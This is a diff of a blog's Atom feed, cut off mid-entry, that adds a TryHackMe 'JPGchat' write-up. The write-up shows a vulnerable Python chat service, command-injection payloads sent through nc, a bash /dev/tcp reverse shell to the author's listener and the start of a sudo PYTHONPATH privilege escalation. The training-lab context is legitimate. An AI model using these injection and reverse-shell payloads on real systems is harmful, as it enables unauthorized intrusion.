@@ -1,5 +1,260 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.7">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-01-28T07:48:41+00:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">JamBlog</title><subtitle>I'm Jamie, also known as JamBot! This is just where I'll document various impulsive ideas and projects of mine. I like computers and some other stuff :) 
-</subtitle><author><name>JamBot</name></author><entry><title type="html">Cool binary reversing stuff</title><link href="http://localhost:4000/blog/misc-binexp-writeup" rel="alternate" type="text/html" title="Cool binary reversing stuff" /><published>2021-01-10T00:00:00+00:00</published><updated>2021-01-10T00:00:00+00:00</updated><id>http://localhost:4000/blog/bx01</id><content type="html" xml:base="http://localhost:4000/blog/misc-binexp-writeup">&lt;h2 id=&quot;what&quot;&gt;What?&lt;/h2&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.7">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-03-06T15:53:36+00:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">JamBlog</title><subtitle>I'm Jamie, also known as JamBot! This is just where I'll document various impulsive ideas and projects of mine. I like computers and some other stuff :) 
+</subtitle><author><name>JamBot</name></author><entry><title type="html">TryHackMe! JPGchat room</title><link href="http://localhost:4000/blog/THM-JPGchat-writeup" rel="alternate" type="text/html" title="TryHackMe! JPGchat room" /><published>2021-03-05T00:00:00+00:00</published><updated>2021-03-05T00:00:00+00:00</updated><id>http://localhost:4000/blog/THM-JPGchat</id><content type="html" xml:base="http://localhost:4000/blog/THM-JPGchat-writeup">&lt;h1 id=&quot;explanation&quot;&gt;Explanation&lt;/h1&gt;
+
+&lt;p&gt;This is my second tryhackme writeup, and it’s another easy room, but I figured I’d get into the swing of blogging again and just get something out there. Because some of the stuff in &lt;a href=&quot;https://tryhackme.com/room/jpgchat&quot;&gt;this room&lt;/a&gt; is similar to the 0day room, I’ll be trying to go more in depth into multiple possible attack vectors, and specifically how &lt;strong&gt;I&lt;/strong&gt; did things :)&lt;/p&gt;
+
+&lt;h1 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h1&gt;
+
+&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
+
+&lt;p&gt;Okay so as usual for most boot2roots we start of with an nmap scan, to see what ports are open, and what services could be running. Because of the image and description, I’m thinking that this is gonna be a Flask or Django server maybe? This ended up not being the case, but this made me think that the room dev chose python for a reason. Apparantly not?&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://jambot3000.github.io/assets/images/JPGchat-description.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Anyways, here are the results from our nmap scan:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# Nmap 7.80 scan initiated Fri Mar  5 11:31:06 2021 as: nmap -sC -sV -oN nmap.log 10.10.X.X
+Nmap scan report for 10.10.X.X
+Host is up (0.072s latency).
+Not shown: 997 closed ports
+PORT     STATE    SERVICE    VERSION
+22/tcp   open     ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 fe:cc:3e:20:3f:a2:f8:09:6f:2c:a3:af:fa:32:9c:94 (RSA)
+|   256 e8:18:0c:ad:d0:63:5f:9d:bd:b7:84:b8:ab:7e:d1:97 (ECDSA)
+|_  256 82:1d:6b:ab:2d:04:d5:0b:7a:9b:ee:f4:64:b5:7f:64 (ED25519)
+3000/tcp open     tcpwrapped
+8031/tcp filtered unknown
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Fri Mar  5 11:31:18 2021 -- 1 IP address (1 host up) scanned in 12.07 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Cool okay so, the only thing I’m really interested in right now are the 2 high ports, specifically the open one. The SSH server doesn’t concern me too much as I recognise the version is quite recent, so I doubt we have to exploit it.&lt;/p&gt;
+
+&lt;p&gt;as for that tcp port, I have no idea what it is- time for netcat :)&lt;/p&gt;
+
+&lt;h3 id=&quot;investigating-weird-port&quot;&gt;Investigating weird port&lt;/h3&gt;
+
+&lt;p&gt;Now I’m just gonna connect to the port and see what kind of response I get :)&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ nc 10.10.X.X 3000
+Welcome to JPChat
+the source code of this service can be found at our admin's github
+MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel
+REPORT USAGE: use [REPORT] to report someone to the admins (with proof)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Okay so immediately we are told we can find source code for the running service. This seems to be turning into a pwn challenge, in which we are given some code, or an application that we can test locally, to make an exploit- then craft a similar exploit to be used over a network etc.&lt;/p&gt;
+
+&lt;p&gt;Let’s go on github and look for this :)&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://jambot3000.github.io/assets/images/githubJPGchat.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Okay so the second one seems to be what we want here. So let’s just take a look at the source code and see what we can find :)&lt;/p&gt;
+
+&lt;div class=&quot;language-py highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/env python3
+&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;os&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Welcome to JPChat'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'the source code of this service can be found at our admin&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\'&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s github'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;report_form&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
+
+	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'this report will be read by Mozzie-jpg'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;your_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'your name:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;report_text&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'your report:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;bash -c 'echo %s &amp;gt; /opt/jpchat/logs/report.txt'&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;your_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;bash -c 'echo %s &amp;gt;&amp;gt; /opt/jpchat/logs/report.txt'&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;report_text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;chatting_service&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
+
+	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'REPORT USAGE: use [REPORT] to report someone to the admins (with proof)'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;message&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;message&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'[REPORT]'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+		&lt;span class=&quot;n&quot;&gt;report_form&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;message&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'[MESSAGE]'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+		&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'There are currently 0 other users logged in'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+		&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+			&lt;span class=&quot;n&quot;&gt;message2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'[MESSAGE]: '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+			&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;message2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'[REPORT]'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+				&lt;span class=&quot;n&quot;&gt;report_form&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;chatting_service&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Hmm. Okay so this definitely isn’t the code that’s running, so I assume this was made for the purposes of the challenge. Anyway, the vulnerability seems pretty clear here; this code trusts unsanitised user input. As for the actual code that’s running the TCP server I’m not sure. But if it’s anything similar to this, which I think it will be, then we can exploit the trust it puts on the end user&lt;/p&gt;
+
+&lt;h2 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h2&gt;
+
+&lt;p&gt;The part I want to focus on is this:&lt;/p&gt;
+
+&lt;div class=&quot;language-py highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;	&lt;span class=&quot;n&quot;&gt;your_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'your name:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;report_text&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'your report:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;bash -c 'echo %s &amp;gt; /opt/jpchat/logs/report.txt'&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;your_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;bash -c 'echo %s &amp;gt;&amp;gt; /opt/jpchat/logs/report.txt'&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;report_text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;After receiving input, this script goes ahead and puts that input into a command ran on the host. So, for example, if we provided &lt;code class=&quot;highlighter-rouge&quot;&gt;this is a test&lt;/code&gt; as the text for the report, then the host machine would run &lt;code class=&quot;highlighter-rouge&quot;&gt;bash -c 'echo this is a test' &amp;gt; /opt/jpchat/logs/report.txt&lt;/code&gt;. With a little knowlege of bash it’s not hard to create a malicious input here. we can end the echo statement with a semi colon, and then provide our own bash to be ran on the host. the output from that will then be written to report.txt if we embed the malicious payload in the &lt;code class=&quot;highlighter-rouge&quot;&gt;your_name&lt;/code&gt; variable, or it will be appended to report.txt, if we store it in the &lt;code class=&quot;highlighter-rouge&quot;&gt;report_text&lt;/code&gt; variable. Of course this doesn’t matter for us, as all we care about is code execution&lt;/p&gt;
+
+&lt;p&gt;So let’s see if we can do this :)&lt;/p&gt;
+
+&lt;p&gt;I’m going to start a python simple http server and try to get the machine to send a GET request via curl. Here is the one liner I made to do this:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ python3 -c 'IP=&quot;YOUR IP HERE&quot;; PORT=&quot;PORT HERE&quot;; print(f&quot;[REPORT]\nname\n;curl http://{IP}:{PORT}&quot;)' | nc 10.10.X.X 3000
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So what this is doing, is printing 3 seperate lines (\n is used to indicate a newline). The first line is &lt;code class=&quot;highlighter-rouge&quot;&gt;[REPORT]&lt;/code&gt;, the second line is just some random input provided for name, and then the last line is &lt;code class=&quot;highlighter-rouge&quot;&gt;;curl http://ip:port&lt;/code&gt;. The semi colon at the start of this line is what I was talking about before- we use it to show the end of the echo statement, so that we can begin our own. The last part &lt;code class=&quot;highlighter-rouge&quot;&gt;| nc 10.10.X.X 3000&lt;/code&gt; is simply the input being generated by python being piped into the tcp connection we make with netcat. So we run this, and….&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ python3 -c 'IP=&quot;YOUR IP&quot;; PORT=&quot;PORT&quot;; print(f&quot;[REPORT]\nname\n;curl http://{IP}:{PORT}&quot;)' | nc 10.10.X.X 3000
+Welcome to JPChat
+the source code of this service can be found at our admin's github
+MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel
+REPORT USAGE: use [REPORT] to report someone to the admins (with proof)
+this report will be read by Mozzie-jpg
+your name:
+your report:
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ sudo python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.X.X - - [05/Mar/2021 15:53:29] &quot;GET / HTTP/1.1&quot; 200 -
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Awesome!! We got code execution! Now, sending a request to a server is a common way to test for code execution, but it is also equally common for systems to have firewalls blocking tcp connections, and requests. DNS smuggling can allow us to mitigate this problem. It’s less common for there to be something filtering DNS requests, as well if urls are to be resolved, then DNS requests must be made. Of course there are other options if we need to bypass firewalls, that’s just a common one.&lt;/p&gt;
+
+&lt;p&gt;For more information on this, please check out stok’s video on this subject: &lt;a href=&quot;https://www.youtube.com/watch?v=p8wbebEgtDk&quot;&gt;https://www.youtube.com/watch?v=p8wbebEgtDk&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;Anyways now that we have code execution, and we touched on another method of data exfiltration we could have used, lets try getting a shell :) I won’t be going into the different methods of doing that, as I already done that in a &lt;a href=&quot;https://jambot3000.github.io/blog/THM-0DAY-writeup&quot;&gt;different blog&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;We’re just gonna be going for a basic reverse tcp shell. So the code we want to execute on the server will be something like: &lt;code class=&quot;highlighter-rouge&quot;&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/IP/PORT 0&amp;gt;&amp;amp;1&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Naturally the first thing I try is setting up a listener and then trying out &lt;code class=&quot;highlighter-rouge&quot;&gt;python3 -c 'IP=&quot;IP&quot;; PORT=&quot;PORT&quot;; print(f&quot;[REPORT]\nname\n;bash -i &amp;gt;&amp;amp; /dev/tcp/{IP}/{PORT} 0&amp;gt;&amp;amp;1&quot;)' | nc 10.10.X.X 3000&lt;/code&gt; as the payload. And well, I got a shell, but it wasn’t functional. I wasn’t able to get output.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ nc -nlvp 3000
+Listening on 0.0.0.0 3000
+Connection received on 10.10.201.9 55046
+bash: cannot set terminal process group (993): Inappropriate ioctl for device
+bash: no job control in this shell
+wes@ubuntu-xenial:/$ ls
+ls
+wes@ubuntu-xenial:/$
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So we see that it tells us that for whatever reason, the input/output control is weird and not good enough to get us a stable shell. As I couldn’t see what was going on behind the scenes, I assumed that this was due to how the tcp server had been made. Maybe it was handling input weirdly and not properly encoding/decoding it? or maybe it was running under some other weird conditions I couldn’t see? I wasn’t entirely sure why this wasn’t working, so I started playing around with the input. Eventually through fuzzing and playing around with the server, I found that the use of &lt;code class=&quot;highlighter-rouge&quot;&gt;$()&lt;/code&gt; would show output in my listener, when a command was used in it. After completing the CTF I took a look at some other writeups to see if anyone else had encoutered this problem but this didn’t seem to be the case at all? Maybe it was something to do with my one liner, or maybe it’s a bug in the room. Either way it’s fine, I got something that worked for me in the end. I understand that it can be annoying seeing “just play around with it” but I can’t put it into better words unfortunately. All I done was try out different things I’ve seen work before, until eventually I got something to work. It can be a tedious process but sometimes there just aren’t ways to avoid it.&lt;/p&gt;
+
+&lt;p&gt;So, the payload that got actually got me output ended up being: &lt;code class=&quot;highlighter-rouge&quot;&gt;python3 -c 'IP=&quot;PORT&quot;; PORT=&quot;PORT&quot;; print(f&quot;[REPORT]\nname\n;echo $(ls) | nc {IP} {PORT}&quot;)' | nc 10.10.X.X 3000&lt;/code&gt;. This gave me the following output:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ nc -nlvp 3000
+Listening on 0.0.0.0 3000
+Connection received on 10.10.201.9 55078
+bin boot box_setup dev etc home initrd.img initrd.img.old lib lib64 lost+found media mnt opt proc root run sbin snap srv sys tmp usr vagrant var vmlinuz vmlinuz.old
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Cool, so we got that to work. As for how I knew netcat was on the machine, well, I didn’t- I honestly just guessed. I was pretty sure that netcat was a package included with a standard ubuntu xenial installation, and I knew it would make things easier for me so it was worth the try.&lt;/p&gt;
+
+&lt;h3 id=&quot;finally-popping-a-shell&quot;&gt;Finally popping a shell.&lt;/h3&gt;
+
+&lt;p&gt;After seeing I was able to get commands to work using &lt;code class=&quot;highlighter-rouge&quot;&gt;$()&lt;/code&gt; I figured the next logical step was to try getting a shell again, but placing the bash to spawn a reverse shell inside of those brackets&lt;/p&gt;
+
+&lt;p&gt;So we try it: &lt;code class=&quot;highlighter-rouge&quot;&gt;python3 -c 'IP=&quot;IP&quot;;PORT=&quot;PORT&quot;;print(f&quot;[REPORT]\nname\n;$(bash -i &amp;gt;&amp;amp; /dev/tcp/{IP}/{PORT} 0&amp;gt;&amp;amp;1)&quot;)' | nc 10.10.X.X 3000&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;and:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ nc -nlvp 3000
+Listening on 0.0.0.0 3000
+Connection received on 10.10.201.9 55096
+bash: cannot set terminal process group (1686): Inappropriate ioctl for device
+bash: no job control in this shell
+wes@ubuntu-xenial:/$ id
+id
+uid=1001(wes) gid=1001(wes) groups=1001(wes)
+wes@ubuntu-xenial:/$
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Okay this is great, but, now I’m even more confused. We got a shell on the server which is great, but we got the same error as before. I’m still not sure why that happened, I’d love to find out though :)&lt;/p&gt;
+
+&lt;h2 id=&quot;user&quot;&gt;User&lt;/h2&gt;
+
+&lt;p&gt;The user flag can be found in &lt;code class=&quot;highlighter-rouge&quot;&gt;wes&lt;/code&gt;’s home directory&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wes@ubuntu-xenial:~$ cat user.txt
+cat user.txt
+JPC{do it yourself!}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;root&quot;&gt;Root&lt;/h2&gt;
+
+&lt;p&gt;Okay so my approach to privilege escelation was kind of boring. As a lot of easy boot2roots have common privesc vectors, I find that it’s often one of a few things. I always make sure to check the kernel version being used (incase there are any major exploits available), the permissions we have as a user, and the binaries with the SUID bit enabled. As I checked what our user is able to run as root with &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo -l&lt;/code&gt; I found the privesc vector. I see a lot of people complain that writeups don’t go into how you were supposed to know to do something. To this I’d say experience is the most tool you have, but there are enumeeration scripts available that can aid the process. &lt;a href=&quot;https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS&quot;&gt;LinPeas&lt;/a&gt; and &lt;a href=&quot;https://github.com/rebootuser/LinEnum&quot;&gt;LinEnum&lt;/a&gt; are popular ones that can work wonders.&lt;/p&gt;
+
+&lt;p&gt;Anyways, after running &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo -l&lt;/code&gt; or running one of the enum scripts mentioned, we should eventually find this:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wes@ubuntu-xenial:/$ sudo -l
+sudo -l
+Matching Defaults entries for wes on ubuntu-xenial:
+    mail_badpass, env_keep+=PYTHONPATH
+
+User wes may run the following commands on ubuntu-xenial:
+    (root) SETENV: NOPASSWD: /usr/bin/python3 /opt/development/test_module.py
+wes@ubuntu-xenial:/$
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Basically what this tell us is that we can run &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/bin/python3 /opt/development/test_module.py&lt;/code&gt; as root.&lt;/p&gt;
+
+&lt;p&gt;So naturally we look at the code for this script, to see what we are actaully running as root.&lt;/p&gt;
+
+&lt;div class=&quot;language-py highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/env python3
+&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;compare&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;compare&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'hello'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'hello'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'hello'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So when I seen this, I originally had the wrong idea. I thought about what happens when you import a python module. Like if you had installed numpy, but then also had a file called &lt;code class=&quot;highlighter-rouge&quot;&gt;numpy.py&lt;/code&gt; in the same directory as the python script you are running, which will it really import? So I tested this out on my system and found that it will default to the file in the same directory as the script you run. So then the next logical step knowing this, was to create a &lt;code class=&quot;highlighter-rouge&quot;&gt;compare.py&lt;/code&gt; file with some malicious code in the &lt;code class=&quot;highlighter-rouge&quot;&gt;/opt/development/&lt;/code&gt; directory. But the problem was that I didn’t know if I had write access to this directory. So I tried creating a new “compare.py” file in this directory.&lt;/p&gt;
+
+&lt;p&gt;And…&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wes@ubuntu-xenial:/opt/development$ touch compare.py
+touch: cannot touch 'compare.py': Permission denied
+wes@ubuntu-xenial:/opt/development$
